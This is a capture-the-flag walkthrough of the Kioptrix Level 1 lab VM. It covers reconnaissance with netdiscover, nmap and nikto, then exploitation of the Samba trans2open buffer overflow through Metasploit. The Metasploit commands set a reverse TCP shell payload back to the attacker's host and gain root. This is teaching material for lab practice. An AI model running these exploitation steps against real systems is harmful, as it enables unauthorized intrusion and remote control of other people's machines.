### Info Sec Writeup
![](https://miro.medium.com/v2/resize:fit:1167/1*oWMF_MkRygQnrbdi_k6Q6A.jpeg)

Kioptrix is a boot to root challenge which you can download from [Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/). You can download and install it on your virtual machine.
![](https://miro.medium.com/v2/resize:fit:1167/1*ENRn1Sf2xbDMVN7s0oA_7w.png)

**Description**
	This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

**Methodology**
	- Network Scanning
	- Enumeration
	- Exploitation
	- Gaining root access

**Used Tools**
	- Nmap
	- Nikto
	- Metasploit


Turn on your attacking machine (Kioptrix 1.0 Virtual Machine) and scan the local network for getting the victim's IP address. You can use **netdiscover** command for that.

> `sudo netdiscover`
![](https://miro.medium.com/v2/resize:fit:1167/1*U-RFqO257sI6ZZ06PYCZig.png)
![](https://miro.medium.com/v2/resize:fit:1167/1*HClrkBOeNhRBQn3Ud0WTNQ.png)

After getting the IP address of the target we are going to enumerate the target for open ports and protocols. I have used Nmap aggressive command for that. Please consider your target IP address may be different from mine.

- Here is my nmap result but this may slightly different from yours because I have installed Nmap scripts for my machine.

> `nmap -A 192.168.1.14 -oN results.txt`
- oN -To save the output into a file

![](https://miro.medium.com/v2/resize:fit:1167/1*P13bMXBr0vKq5d-_3omBZQ.png)
![](https://miro.medium.com/v2/resize:fit:1167/1*fgtBhZ8m3RopnkmDHRorLw.png)
![](https://miro.medium.com/v2/resize:fit:1167/1*PghaNTfpsA4rHPUs7Vqraw.png)

Since port 80 is open and that’s running apache service. So, I tried to look at it. But that is only a test page.
![](https://miro.medium.com/v2/resize:fit:1167/1*GSBBL-oyXe3GDs2YhiAmDg.png)

Then I viewed the page source to get more information. But it doesn’t give much information.
![](https://miro.medium.com/v2/resize:fit:1167/1*xOYnO-LAh-4JeBagsvEGfQ.png)

Then I used **nikto** vulnerability scanning with the help of the following command.
> `nikto -h http://192.168.1.14`
![](https://miro.medium.com/v2/resize:fit:1167/1*4GIKZP3mga633UheoyHGEA.png)

Since with help of the above enumeration, it becomes clear that the lab can exploit in multiple therefore without wasting time we execute the following command with help of Metasploit and try to comprise the target’s VM machine.

This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC.

I used Metasploit to exploit this vulnerability.
To start Metasploit DB we can use the following commands.
> `sudo msfdb init`
> `msfconsole`
![](https://miro.medium.com/v2/resize:fit:1167/1*clrryJFJZ-bZgwq3myhZBg.png)

Then we search the vulnerability and configure options for exploitation.
> `search trans2open`
![](https://miro.medium.com/v2/resize:fit:1167/1*uGV8jiy-wJgJQlD0272D4A.png)

> `use exploit/linux/samba/trans2open`

We can use **options** command to see the options.
![](https://miro.medium.com/v2/resize:fit:1167/1*GmggA3F47WLIQIgr1X6fDA.png)

Then configure the remote host(RHOST), Localhost (LHOST), and the payload. Here we use the reverse_tcp shell to escalate the privileges.
```bash
> msf exploit(linux/samba/trans2open) > set RHOST192.168.1.14
> msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
> msf exploit(linux/samba/trans2open) > set lhost 192.168.1.15
> msf exploit(linux/samba/trans2open) > exploit
```

![](https://miro.medium.com/v2/resize:fit:1167/1*sxWwtjjuSwhtaisNpZjk9g.png)

Booom!! Here we have a command shell of the victim’s machine with root access.
